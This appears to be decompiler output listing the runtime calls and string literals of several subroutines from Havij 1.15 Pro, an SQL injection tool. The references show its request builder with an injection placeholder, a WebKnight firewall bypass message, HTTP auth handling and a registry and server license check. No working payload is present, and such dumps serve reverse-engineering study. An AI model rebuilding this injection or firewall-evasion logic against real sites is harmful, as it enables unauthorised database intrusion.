'N  * ref: __vbaVarVargNofree
'N  * ref: __vbaInStrVar
'N  * ref: __vbaVarTstGt
'N  * ref: __vbaFreeVar
'N  * ref: "?"
'N  * ref: __vbaVarVargNofree
'N  * ref: __vbaLenVar
'N  * ref: __vbaVarVargNofree
'N  * ref: __vbaInStrVar
'N  * ref: __vbaVarSub
'N  * ref: __vbaI4Var
'N  * ref: Right(
'N  * ref: __vbaVargVarMove
'N  * ref: __vbaFreeVar
'N  * ref: __vbaVarVargNofree
'N  * ref: __vbaLenVar
'N  * ref: __vbaVarVargNofree
'N  * ref: __vbaLenVar
'N  * ref: __vbaVarSub
'N  * ref: __vbaVarSub
'N  * ref: __vbaI4Var
'N  * ref: Left(
'N  * ref: __vbaVargVarMove
'N  * ref: __vbaVargVarCopy
'N  * ref: __vbaVarVargNofree
'N  * ref: __vbaVargVarCopy
'N  * ref: "/"
'N  * ref: __vbaVarVargNofree
'N  * ref: __vbaStrVarVal
'N  * ref: InstrRev(
'N  * ref: Left(
'N  * ref: __vbaVargVarMove
'N  * ref: __vbaFreeStr
'N  * ref: __vbaVarVargNofree
'N  * ref: __vbaLenVar
'N  * ref: __vbaVarAdd
'N  * ref: __vbaI4Var
'N  * ref: Mid(
'N  * ref: __vbaVargVarMove
'N  * ref: __vbaFreeVarList
'N  * ref: ":"
'N  * ref: __vbaVarVargNofree
'N  * ref: __vbaVarVargNofree
'N  * ref: __vbaVarCat
'N  * ref: __vbaVarCat
'N  * ref: __vbaVarVargNofree
'N  * ref: __vbaVarCat
'N  * ref: __vbaVargVarMove
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaFreeVar
'N  * ref: __vbaFreeStr
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaFreeVar
'N  * ref: __vbaFreeVar
'N  * ref: __vbaFreeVar
'N  * ref: __vbaFreeVar
'End Sub
 
'Sub Subr_146()
'N  * ref: __vbaExceptHandler
'N  * ref: __vbaVarDup
'N  * ref: __vbaStrCopy
'N  * ref: __vbaOnError
'N  * ref: __vbaStrCmp
'N  * ref: Subr_145
'N  * ref: __vbaFreeVarList
'N  * ref: "http://"
'N  * ref: __vbaVarTstEq
'N  * ref: "80"
'N  * ref: __vbaVarCmpNe
'N  * ref: __vbaVarAnd
'N  * ref: __vbaBoolVarNull
'N  * ref: __vbaFreeVar
'N  * ref: "The target's port is not 80! Please register to activate injecting targets with any port"
'N  * ref: __vbaStrCmp
'N  * ref: IIf(
'N  * ref: __vbaStrCmp
'N  * ref: Subr_141
'N  * ref: __vbaFreeVarList
'N  * ref: Timer
'N  * ref: IsMissing(
'N  * ref: __vbaStrCopy
'N  * ref: __vbaStrVarVal
'N  * ref: Subr_138
'N  * ref: __vbaStrMove
'N  * ref: Subr_142
'N  * ref: __vbaFreeStrList
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaStrCopy
'N  * ref: __vbaStrVarVal
'N  * ref: Subr_138
'N  * ref: __vbaStrMove
'N  * ref: Subr_142
'N  * ref: __vbaFreeStrList
'N  * ref: __vbaFreeVar
'N  * ref: Timer
'N  * ref: __vbaGenerateBoundsError
'N  * ref: "https://"
'N  * ref: __vbaVarTstEq
'N  * ref: "Please register to activate injecting targets with Https protocol!"
'N  * ref: Subr_143
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaExitProc
'N  * ref: "Host: "
'N  * ref: vbCrLf
'N  * ref: vbCrLf
'N  * ref: __vbaStrCat
'N  * ref: __vbaStrCmp
'N  * ref: IIf(
'N  * ref: "Content-Type: application/x-www-form-urlencoded"
'N  * ref: vbCrLf
'N  * ref: IIf(
'N  * ref: __vbaVarCat
'N  * ref: __vbaStrVarMove
'N  * ref: __vbaStrMove
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaLenVar
'N  * ref: __vbaI4Var
'N  * ref: Mid(
'N  * ref: __vbaVarMove
'N  * ref: __vbaFreeVar
'N  * ref: Subr_168
'N  * ref: __vbaStrVarVal
'N  * ref: "%Inject_Here%"
'N  * ref: Replace(
'N  * ref: __vbaStrMove
'N  * ref: __vbaFreeStr
'N  * ref: __vbaNew2
'N  * ref: __vbaObjSet
'N  * ref: __vbaLateIdCall
'N  * ref: __vbaFreeObj
'N  * ref: Timer
'N  * ref: "POST"
'N  * ref: "GET"
'N  * ref: IIf(
'N  * ref: "%Inject_Here%"
'N  * ref: Replace(
'N  * ref: IIf(
'N  * ref: "%Inject_Here%"
'N  * ref: Replace(
'N  * ref: __vbaNew2
'N  * ref: __vbaObjSet
'N  * ref: __vbaLateIdCall
'N  * ref: __vbaFreeStrList
'N  * ref: __vbaFreeObj
'N  * ref: __vbaFreeVarList
'N  * ref: DoEvents
'N  * ref: Timer
'N  * ref: __vbaGenerateBoundsError
'N  * ref: __vbaStrCmp
'N  * ref: __vbaExitProc
'N  * ref: __vbaFreeStrList
'N  * ref: __vbaFreeObj
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaFreeVar
'N  * ref: __vbaFreeStr
'N  * ref: __vbaFPException
'N  * ref: __vbaErrorOverflow
'End Sub
 
'Sub Subr_147()
'N  * ref: __vbaExceptHandler
'N  * ref: __vbaChkstk
'N  * ref: __vbaOnError
'N  * ref: __vbaStrCopy
'N  * ref: "LastCheck"
'N  * ref: __vbaStrCopy
'N  * ref: "Software\Havij\Registration"
'N  * ref: __vbaStrCopy
'N  * ref: Subr_755
'N  * ref: __vbaVarMove
'N  * ref: __vbaFreeStrList
'N  * ref: __vbaStrVarCopy
'N  * ref: __vbaStrMove
'N  * ref: Subr_744
'N  * ref: __vbaStrMove
'N  * ref: Subr_745
'N  * ref: __vbaStrMove
'N  * ref: "%String_Column%"
'N  * ref: __vbaStrCat
'N  * ref: Subr_752
'N  * ref: __vbaVarMove
'N  * ref: __vbaFreeStrList
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaVarMove
'N  * ref: Now
'N  * ref: "s"
'N  * ref: DateDiff(
'N  * ref: __vbaVarMove
'N  * ref: __vbaFreeVar
'N  * ref: __vbaVarCopy
'N  * ref: __vbaVarCmpGe
'N  * ref: __vbaVarAnd
'N  * ref: __vbaVarAnd
'N  * ref: __vbaBoolVarNull
'N  * ref: __vbaFreeVarList
'N  * ref: Now
'N  * ref: __vbaStrVarMove
'N  * ref: __vbaStrMove
'N  * ref: __vbaFreeVar
'N  * ref: Subr_745
'N  * ref: __vbaStrMove
'N  * ref: "%String_Column%"
'N  * ref: __vbaStrCat
'N  * ref: Subr_751
'N  * ref: __vbaStrMove
'N  * ref: __vbaFreeStr
'N  * ref: __vbaFreeVar
'N  * ref: Subr_743
'N  * ref: __vbaStrMove
'N  * ref: "LastCheck"
'N  * ref: __vbaStrCopy
'N  * ref: "Software\Havij\Registration"
'N  * ref: __vbaStrCopy
'N  * ref: Subr_754
'N  * ref: __vbaFreeStrList
'N  * ref: "L2hhdmlqODk2L3ZhbGlkYXRlLnBocD92ZXI9"
'N  * ref: Subr_744
'N  * ref: __vbaStrMove
'N  * ref: "Havij: r3dm0v3"
'N  * ref: __vbaVarDup
'N  * ref: __vbaStrMove
'N  * ref: __vbaStrCat
'N  * ref: __vbaStrMove
'N  * ref: "Havij 1.15 Pro"
'N  * ref: __vbaStrCat
'N  * ref: __vbaStrMove
'N  * ref: "&hi=hello"
'N  * ref: __vbaStrCat
'N  * ref: __vbaStrMove
'N  * ref: __vbaChkstk
'N  * ref: Subr_146
'N  * ref: __vbaVarMove
'N  * ref: __vbaFreeStrList
'N  * ref: __vbaFreeVar
'N  * ref: Subr_144
'N  * ref: __vbaStrMove
'N  * ref: vbCrLf
'N  * ref: vbCrLf
'N  * ref: __vbaStrCat
'N  * ref: __vbaStrMove
'N  * ref: __vbaInStr
'N  * ref: __vbaFreeStr
'N  * ref: __vbaLenBstr
'N  * ref: vbCrLf
'N  * ref: vbCrLf
'N  * ref: __vbaStrCat
'N  * ref: __vbaStrMove
'N  * ref: __vbaInStr
'N  * ref: Right(
'N  * ref: __vbaStrVarMove
'N  * ref: __vbaStrMove
'N  * ref: __vbaFreeStr
'N  * ref: __vbaFreeVar
'N  * ref: Subr_186
'N  * ref: __vbaVarMove
'N  * ref: __vbaStrCopy
'N  * ref: Subr_748
'N  * ref: __vbaVarMove
'N  * ref: LCase(
'N  * ref: "itsecteam.com"
'N  * ref: __vbaStrCat
'N  * ref: Subr_751
'N  * ref: __vbaStrMove
'N  * ref: __vbaFreeVarList
'N  * ref: "L2hhdmlqODk2L3ZhbGlkYXRlLnBocD92ZXI9"
'N  * ref: Subr_744
'N  * ref: __vbaStrMove
'N  * ref: "Havij 1.15 Pro"
'N  * ref: __vbaVarDup
'N  * ref: Subr_192
'N  * ref: __vbaStrMove
'N  * ref: Subr_192
'N  * ref: __vbaStrMove
'N  * ref: Subr_743
'N  * ref: Subr_192
'N  * ref: __vbaStrMove
'N  * ref: "Havij: r3dm0v3"
'N  * ref: __vbaVarDup
'N  * ref: __vbaStrMove
'N  * ref: __vbaStrCat
'N  * ref: __vbaStrMove
'N  * ref: __vbaStrMove
'N  * ref: __vbaStrCat
'N  * ref: __vbaStrMove
'N  * ref: "&name="
'N  * ref: __vbaStrCat
'N  * ref: __vbaStrMove
'N  * ref: __vbaStrMove
'N  * ref: __vbaStrCat
'N  * ref: __vbaStrMove
'N  * ref: "&checksum="
'N  * ref: __vbaStrCat
'N  * ref: "&t="
'N  * ref: __vbaVarCat
'N  * ref: __vbaVarCat
'N  * ref: __vbaVarCat
'N  * ref: __vbaStrVarVal
'N  * ref: __vbaChkstk
'N  * ref: Subr_146
'N  * ref: __vbaVarMove
'N  * ref: __vbaFreeStrList
'N  * ref: __vbaFreeVarList
'N  * ref: Now
'N  * ref: __vbaStrVarMove
'N  * ref: __vbaStrMove
'N  * ref: __vbaFreeVar
'N  * ref: Subr_745
'N  * ref: __vbaStrMove
'N  * ref: "%String_Column%"
'N  * ref: __vbaStrCat
'N  * ref: Subr_751
'N  * ref: __vbaStrMove
'N  * ref: __vbaFreeStr
'N  * ref: __vbaFreeVar
'N  * ref: Subr_743
'N  * ref: __vbaStrMove
'N  * ref: "LastCheck"
'N  * ref: __vbaStrCopy
'N  * ref: "Software\Havij\Registration"
'N  * ref: __vbaStrCopy
'N  * ref: Subr_754
'N  * ref: __vbaFreeStrList
'N  * ref: Subr_144
'N  * ref: __vbaStrMove
'N  * ref: vbCrLf
'N  * ref: vbCrLf
'N  * ref: __vbaStrCat
'N  * ref: __vbaStrMove
'N  * ref: __vbaInStr
'N  * ref: __vbaFreeStr
'N  * ref: __vbaLenBstr
'N  * ref: vbCrLf
'N  * ref: vbCrLf
'N  * ref: __vbaStrCat
'N  * ref: __vbaStrMove
'N  * ref: __vbaInStr
'N  * ref: Right(
'N  * ref: __vbaStrVarMove
'N  * ref: __vbaStrMove
'N  * ref: __vbaFreeStr
'N  * ref: __vbaFreeVar
'N  * ref: Subr_744
'N  * ref: __vbaStrMove
'N  * ref: Subr_752
'N  * ref: __vbaStrMove
'N  * ref: __vbaFreeStr
'N  * ref: __vbaFreeVar
'N  * ref: __vbaStrCopy
'N  * ref: __vbaVarCopy
'N  * ref: __vbaNew2
'N  * ref: __vbaObjSet
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeObj
'N  * ref: __vbaNew2
'N  * ref: __vbaObjSet
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeObj
'N  * ref: __vbaStrI2
'N  * ref: __vbaStrMove
'N  * ref: "Registered"
'N  * ref: __vbaStrCopy
'N  * ref: "Software\Havij\Registration"
'N  * ref: __vbaStrCopy
'N  * ref: Subr_754
'N  * ref: __vbaFreeStrList
'N  * ref: "Can not check license validation, Please try about 10 minutes later."
'N  * ref: __vbaVarDup
'N  * ref: MsgBox
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaStrCmp
'N  * ref: __vbaVarCmpNe
'N  * ref: __vbaVarOr
'N  * ref: __vbaBoolVarNull
'N  * ref: __vbaFreeVar
'N  * ref: __vbaStrCmp
'N  * ref: FreeFile
'N  * ref: __vbaVarMove
'N  * ref: __vbaFreeVar
'N  * ref: __vbaNew2
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaHresultCheckObj
'N  * ref: Right(
'N  * ref: __vbaNew2
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaHresultCheckObj
'N  * ref: "\"
'N  * ref: __vbaVarDup
'N  * ref: __vbaVarDup
'N  * ref: "\"
'N  * ref: __vbaVarCmpEq
'N  * ref: __vbaVarMove
'N  * ref: IIf(
'N  * ref: "temp.tmp"
'N  * ref: __vbaVarCat
'N  * ref: __vbaVarCat
'N  * ref: __vbaStrVarVal
'N  * ref: FileLen(
'N  * ref: Space(
'N  * ref: __vbaStrVarMove
'N  * ref: __vbaStrMove
'N  * ref: __vbaFreeStr
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaNew2
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaNew2
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaHresultCheckObj
'N  * ref: Right(
'N  * ref: "\"
'N  * ref: __vbaVarDup
'N  * ref: __vbaVarDup
'N  * ref: "\"
'N  * ref: __vbaVarCmpEq
'N  * ref: __vbaVarMove
'N  * ref: IIf(
'N  * ref: "temp.tmp"
'N  * ref: __vbaVarCat
'N  * ref: __vbaVarCat
'N  * ref: __vbaStrVarMove
'N  * ref: __vbaStrMove
'N  * ref: __vbaI2Var
'N  * ref: __vbaFileOpen
'N  * ref: __vbaFreeStr
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaI2Var
'N  * ref: __vbaGet3
'N  * ref: __vbaI2Var
'N  * ref: __vbaFileClose
'N  * ref: Subr_745
'N  * ref: __vbaStrMove
'N  * ref: "%String_Column%"
'N  * ref: __vbaStrCat
'N  * ref: Subr_750
'N  * ref: __vbaStrMove
'N  * ref: __vbaFreeStr
'N  * ref: __vbaFreeVar
'N  * ref: __vbaStrCmp
'N  * ref: Subr_186
'N  * ref: __vbaStrMove
'N  * ref: "|"
'N  * ref: __vbaVarDup
'N  * ref: __vbaStrMove
'N  * ref: Split(
'N  * ref: __vbaVarMove
'N  * ref: __vbaFreeStrList
'N  * ref: __vbaFreeVar
'N  * ref: __vbaRefVarAry
'N  * ref: __vbaUbound
'N  * ref: "1234"
'N  * ref: __vbaVarDup
'N  * ref: "bSEQ"
'N  * ref: __vbaVarDup
'N  * ref: Subr_750
'N  * ref: __vbaChkstk
'N  * ref: __vbaVarIndexLoad
'N  * ref: __vbaVarTstNe
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaObjSet
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeObj
'N  * ref: __vbaStrI2
'N  * ref: __vbaStrMove
'N  * ref: "Registered"
'N  * ref: __vbaStrCopy
'N  * ref: "Software\Havij\Registration"
'N  * ref: __vbaStrCopy
'N  * ref: Subr_754
'N  * ref: __vbaFreeStrList
'N  * ref: __vbaStrCopy
'N  * ref: "LastCheck"
'N  * ref: __vbaStrCopy
'N  * ref: "Software\Havij\Registration"
'N  * ref: __vbaStrCopy
'N  * ref: Subr_754
'N  * ref: __vbaFreeStrList
'N  * ref: __vbaNew2
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaHresultCheckObj
'N  * ref: Right(
'N  * ref: __vbaNew2
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaHresultCheckObj
'N  * ref: "\"
'N  * ref: __vbaVarDup
'N  * ref: __vbaVarDup
'N  * ref: "\"
'N  * ref: __vbaVarCmpEq
'N  * ref: __vbaVarMove
'N  * ref: IIf(
'N  * ref: "temp.tmp"
'N  * ref: __vbaVarCat
'N  * ref: __vbaVarCat
'N  * ref: __vbaStrVarVal
'N  * ref: __vbaStrToAnsi
'N  * API ref: DeleteFileA
'N  * ref: __vbaSetSystemError
'N  * ref: __vbaFreeStrList
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaChkstk
'N  * ref: __vbaVarIndexLoad
'N  * ref: "Your license is not valid!"
'N  * ref: vbCrLf
'N  * ref: __vbaStrCat
'N  * ref: __vbaStrMove
'N  * ref: vbCrLf
'N  * ref: __vbaStrCat
'N  * ref: __vbaStrMove
'N  * ref: "Further info:"
'N  * ref: __vbaStrCat
'N  * ref: __vbaStrMove
'N  * ref: vbCrLf
'N  * ref: __vbaStrCat
'N  * ref: __vbaVarCat
'N  * ref: MsgBox
'N  * ref: __vbaFreeStrList
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaChkstk
'N  * ref: __vbaVarIndexLoad
'N  * ref: __vbaStrVarMove
'N  * ref: __vbaStrMove
'N  * ref: __vbaFreeVar
'N  * ref: __vbaChkstk
'N  * ref: __vbaVarIndexLoad
'N  * ref: __vbaStrVarMove
'N  * ref: __vbaStrMove
'N  * ref: __vbaFreeVar
'N  * ref: __vbaChkstk
'N  * ref: __vbaVarIndexLoad
'N  * ref: __vbaStrVarMove
'N  * ref: __vbaStrMove
'N  * ref: __vbaFreeVar
'N  * ref: __vbaChkstk
'N  * ref: __vbaVarIndexLoad
'N  * ref: __vbaStrVarMove
'N  * ref: __vbaStrMove
'N  * ref: __vbaFreeVar
'N  * ref: __vbaChkstk
'N  * ref: __vbaVarIndexLoad
'N  * ref: __vbaVarMove
'N  * ref: FreeFile
'N  * ref: __vbaVarMove
'N  * ref: __vbaFreeVar
'N  * ref: __vbaNew2
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaNew2
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaHresultCheckObj
'N  * ref: Right(
'N  * ref: "\"
'N  * ref: __vbaVarDup
'N  * ref: __vbaVarDup
'N  * ref: "\"
'N  * ref: __vbaVarCmpEq
'N  * ref: __vbaVarMove
'N  * ref: IIf(
'N  * ref: "temp.tmp"
'N  * ref: __vbaVarCat
'N  * ref: __vbaVarCat
'N  * ref: __vbaStrVarMove
'N  * ref: __vbaStrMove
'N  * ref: __vbaI2Var
'N  * ref: __vbaFileOpen
'N  * ref: __vbaFreeStr
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFreeVarList
'N  * ref: Subr_745
'N  * ref: __vbaStrMove
'N  * ref: __vbaStrMove
'N  * ref: "%String_Column%"
'N  * ref: __vbaStrCat
'N  * ref: Subr_750
'N  * ref: __vbaStrMove
'N  * ref: __vbaStrMove
'N  * ref: __vbaI2Var
'N  * ref: __vbaPut3
'N  * ref: __vbaFreeStrList
'N  * ref: __vbaFreeVar
'N  * ref: __vbaI2Var
'N  * ref: __vbaFileClose
'N  * ref: "http://itsecteam.com"
'N  * ref: __vbaStrCmp
'N  * ref: "http://itsecteambackup.com"
'N  * ref: __vbaStrCopy
'N  * ref: __vbaStrCopy
'N  * ref: "Can not check license validation, some features disabled temporarily."
'N  * ref: vbCrLf
'N  * ref: __vbaStrCat
'N  * ref: __vbaStrMove
'N  * ref: "Make sure you are connected to the internet and Havij has enough privilege to access to the net."
'N  * ref: __vbaStrCat
'N  * ref: __vbaStrMove
'N  * ref: vbCrLf
'N  * ref: __vbaStrCat
'N  * ref: __vbaStrMove
'N  * ref: "If the problem persists contact http://itsecteam.com"
'N  * ref: __vbaStrCat
'N  * ref: MsgBox
'N  * ref: __vbaFreeStrList
'N  * ref: __vbaFreeVarList
'N  * ref: "Can not check license validation, some features disabled temporarily. If the problem persists contact http://itsecteam.com"
'N  * ref: __vbaVarDup
'N  * ref: Subr_143
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaStrCmp
'N  * ref: __vbaNew2
'N  * ref: __vbaObjSet
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeObj
'N  * ref: __vbaStrI2
'N  * ref: __vbaStrMove
'N  * ref: "Registered"
'N  * ref: __vbaStrCopy
'N  * ref: "Software\Havij\Registration"
'N  * ref: __vbaStrCopy
'N  * ref: Subr_754
'N  * ref: __vbaFreeStrList
'N  * ref: __vbaStrCopy
'N  * ref: "LastCheck"
'N  * ref: __vbaStrCopy
'N  * ref: "Software\Havij\Registration"
'N  * ref: __vbaStrCopy
'N  * ref: Subr_754
'N  * ref: __vbaFreeStrList
'N  * ref: "Can not check license validation, some features disabled temporarily."
'N  * ref: vbCrLf
'N  * ref: __vbaStrCat
'N  * ref: __vbaStrMove
'N  * ref: "Make sure you are connected to the internet and Havij has enough privilege to access to the net."
'N  * ref: __vbaStrCat
'N  * ref: __vbaStrMove
'N  * ref: vbCrLf
'N  * ref: __vbaStrCat
'N  * ref: __vbaStrMove
'N  * ref: "If the problem persists contact http://itsecteam.com"
'N  * ref: __vbaStrCat
'N  * ref: MsgBox
'N  * ref: __vbaFreeStrList
'N  * ref: __vbaFreeVarList
'N  * ref: "Can not check license validation. Make sure you are connected to the internet and Havij has enough privilege to access to the net."
'N  * ref: __vbaVarDup
'N  * ref: Subr_143
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaFreeStrList
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaFreeVar
'N  * ref: __vbaFreeVar
'N  * ref: __vbaFreeStr
'N  * ref: __vbaFreeStr
'N  * ref: __vbaFreeStr
'N  * ref: __vbaFreeVar
'N  * ref: __vbaFreeVar
'N  * ref: __vbaFreeVar
'N  * ref: __vbaFreeStr
'N  * ref: __vbaFreeVar
'N  * ref: __vbaErrorOverflow
'End Sub
 
'Sub Subr_148()
'N  * ref: __vbaExceptHandler
'N  * ref: __vbaOnError
'N  * ref: __vbaVarVargNofree
'N  * ref: __vbaStrVarCopy
'N  * ref: __vbaStrMove
'N  * ref: __vbaStrCmp
'N  * ref: " "
'N  * ref: Replace(
'N  * ref: __vbaLenVar
'N  * ref: __vbaI4Var
'N  * ref: Mid(
'N  * ref: __vbaVarMove
'N  * ref: __vbaFreeVar
'N  * ref: __vbaRefVarAry
'N  * ref: __vbaUbound
'N  * ref: __vbaVarForInit
'N  * ref: __vbaVarIndexLoad
'N  * ref: __vbaStrVarVal
'N  * ref: __vbaNew2
'N  * ref: __vbaObjSet
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaNew2
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaStrBool
'N  * ref: __vbaStrBool
'N  * ref: __vbaStrComp
'N  * ref: Left(
'N  * ref: __vbaVarMove
'N  * ref: __vbaFreeStrList
'N  * ref: __vbaFreeObj
'N  * ref: "::"
'N  * ref: __vbaVarDup
'N  * ref: Split(
'N  * ref: __vbaVarMove
'N  * ref: __vbaFreeStr
'N  * ref: __vbaFreeVarList
'N  * ref: Replace(
'N  * ref: __vbaFreeStrList
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaVarForNext
'N  * ref: __vbaVarIndexLoad
'N  * ref: __vbaStrVarVal
'N  * ref: __vbaLenVar
'N  * ref: __vbaI4Var
'N  * ref: Mid(
'N  * ref: __vbaVarMove
'N  * ref: __vbaFreeVar
'N  * ref: __vbaRefVarAry
'N  * ref: __vbaUbound
'N  * ref: __vbaVarForInit
'N  * ref: __vbaNew2
'N  * ref: __vbaObjSet
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaNew2
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaStrBool
'N  * ref: __vbaStrBool
'N  * ref: __vbaStrComp
'N  * ref: Left(
'N  * ref: __vbaVarMove
'N  * ref: __vbaFreeStrList
'N  * ref: __vbaFreeObj
'N  * ref: "::"
'N  * ref: __vbaVarDup
'N  * ref: Split(
'N  * ref: __vbaVarMove
'N  * ref: __vbaFreeStr
'N  * ref: __vbaFreeVarList
'N  * ref: Replace(
'N  * ref: __vbaFreeStrList
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaVarForNext
'N  * ref: __vbaExitProc
'N  * ref: __vbaFreeStr
'N  * ref: __vbaFreeStrList
'N  * ref: __vbaFreeObj
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaFreeVar
'N  * ref: __vbaErrorOverflow
'End Sub
 
'Sub Subr_149()
'N  * ref: __vbaExceptHandler
'N  * ref: __vbaVarVargNofree
'N  * ref: "="
'N  * ref: __vbaVarCat
'N  * ref: __vbaInStrVar
'N  * ref: __vbaVarMove
'N  * ref: __vbaFreeVar
'N  * ref: __vbaVarTstEq
'N  * ref: ","
'N  * ref: __vbaI4Var
'N  * ref: __vbaInStrVar
'N  * ref: __vbaVarSub
'N  * ref: __vbaLenVar
'N  * ref: __vbaVarSub
'N  * ref: __vbaVarSub
'N  * ref: __vbaVarMove
'N  * ref: __vbaLenVar
'N  * ref: __vbaVarMove
'N  * ref: ","
'N  * ref: __vbaI4Var
'N  * ref: __vbaInStrVar
'N  * ref: __vbaVarCmpEq
'N  * ref: __vbaVarMove
'N  * ref: IIf(
'N  * ref: __vbaLenVar
'N  * ref: __vbaVarAdd
'N  * ref: __vbaI4Var
'N  * ref: Mid(
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaFreeVar
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaFreeVar
'End Sub
 
'Sub Subr_150()
'N  * ref: __vbaExceptHandler
'N  * ref: __vbaVarDup
'N  * ref: __vbaOnError
'N  * ref: __vbaLenVar
'N  * ref: __vbaI4Var
'N  * ref: Mid(
'N  * ref: __vbaVarMove
'N  * ref: __vbaFreeVar
'N  * ref: __vbaUI1I2
'N  * ref: "Requesting: "
'N  * ref: __vbaVarCat
'N  * ref: Subr_143
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaExitProc
'N  * ref: __vbaFreeVar
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaFreeVar
'End Sub
 
'Sub Subr_151()
'N  * ref: __vbaExceptHandler
'N  * ref: __vbaVarDup
'N  * ref: Subr_147
'N  * ref: __vbaStrCopy
'N  * ref: Subr_148
'N  * ref: __vbaVarMove
'N  * ref: __vbaVarMove
'N  * ref: Subr_150
'N  * ref: __vbaFreeVar
'N  * ref: Subr_146
'N  * ref: Subr_144
'N  * ref: __vbaStrMove
'N  * ref: "WebKnight Application Firewall"
'N  * ref: __vbaInStr
'N  * ref: "WebKnight firewall detected, trying to bypass..."
'N  * ref: Subr_143
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaStrCmp
'N  * ref: "WWW-Authenticate"
'N  * ref: Subr_152
'N  * ref: __vbaVarCmpNe
'N  * ref: __vbaVarAnd
'N  * ref: __vbaBoolVarNull
'N  * ref: " "
'N  * ref: __vbaInStrVar
'N  * ref: __vbaVarSub
'N  * ref: __vbaI4Var
'N  * ref: Left(
'N  * ref: "realm"
'N  * ref: Subr_149
'N  * ref: "nonce"
'N  * ref: Subr_149
'N  * ref: "qop"
'N  * ref: Subr_149
'N  * ref: __vbaNew2
'N  * ref: __vbaNew2
'N  * ref: __vbaObjSetAddref
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeObj
'N  * ref: __vbaNew2
'N  * ref: __vbaObjSet
'N  * ref: __vbaHresultCheckObj
'N  * ref: LCase(
'N  * ref: __vbaVarTstEq
'N  * ref: "basic"
'N  * ref: __vbaNew2
'N  * ref: __vbaObjSet
'N  * ref: LCase(
'N  * ref: "digest"
'N  * ref: __vbaNew2
'N  * ref: __vbaObjSet
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeObj
'N  * ref: __vbaNew2
'N  * ref: __vbaObjSet
'N  * ref: __vbaStrCat
'N  * ref: "A username and password are being requested by this url."
'N  * ref: vbCrLf
'N  * ref: __vbaStrMove
'N  * ref: "This site says: "
'N  * ref: __vbaVarCat
'N  * ref: __vbaStrVarVal
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeStrList
'N  * ref: __vbaFreeObj
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaNew2
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaVarDup
'N  * ref: "Authenticating..."
'N  * ref: Subr_143
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaStrCopy
'N  * ref: __vbaVarMove
'N  * ref: __vbaVarDup
'N  * ref: __vbaVarMove
'N  * ref: Subr_136
'N  * ref: Left(
'N  * ref: "200"
'N  * ref: Left(
'N  * ref: "500"
'N  * ref: __vbaVarCmpNe
'N  * ref: __vbaVarCmpNe
'N  * ref: __vbaVarAnd
'N  * ref: __vbaBoolVarNull
'N  * ref: __vbaFreeVarList
'N  * ref: "Http Error: "
'N  * ref: __vbaVarCat
'N  * ref: Subr_143
'N  * ref: __vbaFreeVarList
'N  * ref: LCase(
'N  * ref: "location:"
'N  * ref: __vbaInStrVar
'N  * ref: __vbaVarCmpGt
'N  * ref: __vbaVarAnd
'N  * ref: __vbaBoolVarNull
'N  * ref: __vbaFreeVarList
'N  * ref: "Error: Redirection loop!"
'N  * ref: Subr_143
'N  * ref: __vbaFreeVarList
'N  * ref: "Location"
'N  * ref: Subr_152
'N  * ref: Left(
'N  * ref: "/"
'N  * ref: __vbaVarTstEq
'N  * ref: __vbaStrCmp
'N  * ref: IIf(
'N  * ref: Subr_135
'N  * ref: __vbaVarCat
'N  * ref: __vbaFreeVarList
'N  * ref: "Redirecting to "
'N  * ref: __vbaVarCat
'N  * ref: Subr_143
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaStrCopy
'N  * ref: Subr_151
'N  * ref: __vbaFreeStr
'N  * ref: __vbaFreeStrList
'N  * ref: __vbaFreeObj
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaFreeVar
'N  * ref: __vbaErrorOverflow
'End Sub
 
'Sub Subr_152()
'N  * ref: __vbaExceptHandler
'N  * ref: __vbaOnError
'N  * ref: vbCrLf
'N  * ref: vbCrLf
